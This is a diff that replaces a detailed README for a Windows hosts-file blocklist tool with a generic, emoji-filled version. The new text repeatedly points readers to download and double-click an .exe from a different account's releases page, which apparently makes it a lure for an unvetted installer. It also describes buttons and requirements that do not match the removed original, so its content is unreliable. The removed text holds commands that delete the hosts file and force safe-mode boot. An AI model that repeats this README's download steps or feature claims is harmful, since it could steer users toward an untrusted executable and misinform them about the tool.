@@ -1,85 +1,86 @@
-# Blocklist Manager
+# 🎉 blocklist-mgr - Simplify Your Blocklist Management
 
-The hosts file is a local DNS override used to block domains or redirect websites. (`C:\Windows\System32\drivers\etc\hosts`) A filter get's added via e.g. uBO - filter within the browser -> no system wide blocking.
+[![Download blocklist-mgr](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/haymanwuzup/blocklist-mgr/releases)
 
-Preview:
+## 🚀 Getting Started
 
-https://github.com/user-attachments/assets/3429692e-2587-440a-b48c-a3b8ba46b149
+Welcome to blocklist-mgr! This application helps you select and manage multiple blocklists simply and effectively. You can use it for various tasks, such as modifying hosts files or enhancing your ad-blocking experience with tools like uBlock Origin. 
 
-<ins>Examples:</ins>
-```
-0.0.0.0 ads.com -> non routable address
-127.0.0.1 ads.com -> loopback address
+This guide will help you download and run the software with ease. 
 
-||ads.com^ -> filter (browser)
-@@||ads.com^ -> exception
-```
-First numbers (IP address) is where the domain will be **directed to**, the second (domain name) is the site, which is getting **redirected** (blocked). 
+## 📥 Download & Install
 
-1. [`0.0.0.0`](https://en.wikipedia.org/wiki/0.0.0.0) **blocks/drops** the request instantly - making them "unreachable" (known as being faster than `127.0.01`, but may be incompatible on some systems)
-2. [`127.0.0.1`](https://en.wikipedia.org/wiki/localhost) redirects the domain to the **localhost** (your computer) - called "*loopback address*"
-3. [`||ads.com^`](https://adblockplus.org/filter-cheatsheet?DE_EXCEPTION=1) blocks the domain - wouldn't block `http://domain.com/redirect/http://ads.com/` -> can't be used within the hosts file
-⠀
-You should never use all blocklists! This would break most of your applications & slow down your system by a lot. Applying all lists won't give you a better browsing experience! Try to use at least lists as possible. (or use the default preset) Using big lists system wide (hosts file) is also not recommended - if you're planning to use a big list, do that via e.g. uBO (even if the list is compatible with the hosts file). Importing a list will override your current hosts!
+To get started, you will need to visit the Releases page of our GitHub repository. Follow these steps:
 
-## Issues after importing multiple lists?
+1. Click on this link to **[visit the Downloads Page](https://github.com/haymanwuzup/blocklist-mgr/releases)**.
+2. On the Releases page, find the latest version available.
+3. Look for the files listed under the release. You will see files marked with `.exe` for installation.
+4. Click on the relevant `.exe` file to begin the download.
+5. Once downloaded, locate the file in your downloads folder.
+6. Double-click the file to run the installer.
+7. Follow the on-screen instructions to complete the installation.
 
-Open `cmd` and paste `del /f /q C:\Windows\System32\drivers\etc\hosts` into it. If it shows that the DNS client used it, flush your DNS (`ipconfig /flushdns`). Still not? Boot into safemode (`bcdedit /set safeboot minimal`) & remove the hosts file. This may be needed, if importing too many lists.
+That’s it! You are now ready to start managing your blocklists.
 
-Default `hosts` content:
-```ps
-# Copyright (c) 1993-2009 Microsoft Corp.
-#
-# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
-#
-# This file contains the mappings of IP addresses to host names. Each
-# entry should be kept on an individual line. The IP address should
-# be placed in the first column followed by the corresponding host name.
-# The IP address and the host name should be separated by at least one
-# space.
-#
-# Additionally, comments (such as these) may be inserted on individual
-# lines or following the machine name denoted by a '#' symbol.
-#
-# For example:
-#
-#      102.54.94.97     rhino.acme.com          # source server
-#       38.25.63.10     x.acme.com              # x client host
+## ⚙️ System Requirements
 
-# localhost name resolution is handled within DNS itself.
-#    127.0.0.1       localhost
-#    ::1             localhost
-```
+Before installing, ensure your system meets these requirements:
 
-## GUI Buttons
-The presets are just examples, use lists from the vendor you prefer.
-| Button        | Description                                                                                                                                                                                               |
-|---------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
-| `Minimal`     | Preset, which can be used by anyone (hosts/filter).                                                                                                                                                       |
-| `Default`     | Default preset, compact size (filter).                                                                                                                                                                    |
-| `Maximum`     | For users who want aggressive blocking (filter).                                                                                                                                                          |
-| `Import`      | Imports the currently selected lists into the `hosts` file (if compatible).                                                                                                                               |
-| `Copy Links`  | Copies URLs of all selected lists. Add these links to the custom filter lists:<br>![](https://github.com/5Noxi/blocklist-mgr/blob/main/images/ubolinks.png?raw=true)       |
-| `Restore`     | Imports the backup from: `C:\Windows\System32\drivers\etc\hosts.noverse`.                                                                                                                                 |
-| `Open File`   | Opens the file: `C:\Windows\System32\drivers\etc\hosts`.                                                                                                                                                   |
+- **Operating System:** Windows 10 or later
+- **RAM:** Minimum 2 GB recommended
+- **Disk Space:** At least 50 MB free space for installation
+- **.NET Framework:** Version 4.7.2 or later
 
-## Additional features:
-- Click on the category name (blue) to open the source link
-- Adjust the window size, to increase the size of the hosts/log box
-- `hosts` preview refreshes itself automatically
-- You can edit the hosts file via the panel in the GUI (doesn't create a backup)
+## 🛠 Features
 
-More lists/information:</ins>
-> https://github.com/gorhill/uBlock/wiki/  
-> https://github.com/yokoffing/filterlists  
-> https://adblockplus.org/filter-cheatsheet  
-> https://github.com/DandelionSprout/adfilt  
-> https://github.com/uBlockOrigin/uAssets  
-> https://filterlists.com/  
-> https://pi-hole.net/  
-> https://sefinek.net/blocklist-generator  
-> https://github.com/pixeltris/TwitchAdSolutions  
-> https://learn.microsoft.com/en-us/windows/powertoys/hosts-file-editor  
-> https://pyfunceble.github.io/#/  
-> https://learn.microsoft.com/en-us/windows/privacy/windows-11-endpoints-non-enterprise-editions  
-> https://learn.microsoft.com/en-us/windows/privacy/manage-windows-11-endpoints  
+blocklist-mgr offers several key features to enhance your experience:
+
+- **Easy Selection:** Quickly choose from various blocklists.
+- **User-Friendly Interface:** Simple design that anyone can navigate.
+- **Backup and Restore:** Easily back up your settings and restore them when needed.
+- **Custom Hosts Modification:** Edit hosts files directly for better management.
+- **Support for Multiple Formats:** Works with different hosts or URL formats.
+
+## 📖 Usage Instructions
+
+After installation, using blocklist-mgr is straightforward:
+
+1. Launch the application from your start menu or desktop shortcut.
+2. You will see a main dashboard with options to ‘Select Blocklists’.
+3. Click the button to view available blocklists.
+4. Select the blocklists you wish to use. You can choose multiple lists.
+5. After selection, click ‘Apply’ to update your hosts file accordingly.
+6. To verify changes, you can open the hosts file manually. It is usually located in `C:\Windows\System32\drivers\etc\hosts`.
+
+## ❓ FAQ
+
+### How do I know if the installation was successful?
+
+After double-clicking the installer, you should see a setup wizard. If it runs without errors, the installation is likely successful.
+
+### Can I revert changes made to the hosts file?
+
+Yes, blocklist-mgr includes a backup feature. Before applying any changes, make sure to back up your current hosts file.
+
+### Is there a way to add custom blocklists?
+
+Yes, you can add custom blocklists by clicking the ‘Add Custom Blocklist’ button in the app. Follow the prompts to enter the URL or contact a local file.
+
+### What if I encounter errors while using the application?
+
+For issues, you can check the GitHub repository for troubleshooting tips or open an issue to seek help from the community.
+
+## 💬 Community & Support
+
+For questions, feedback, or support, you can reach out via the Issues section on the [GitHub repository](https://github.com/haymanwuzup/blocklist-mgr/issues). The community is here to help you with any concerns or suggestions.
+
+## 📄 License
+
+blocklist-mgr is released under the MIT License. You can use, modify, and distribute it freely.
+
+## 🔗 Further Resources
+
+- [GitHub Project Page](https://github.com/haymanwuzup/blocklist-mgr)
+- [Wiki & Documentation](https://github.com/haymanwuzup/blocklist-mgr/wiki)
+
+Thank you for choosing blocklist-mgr! Your journey to better blocklist management starts now.
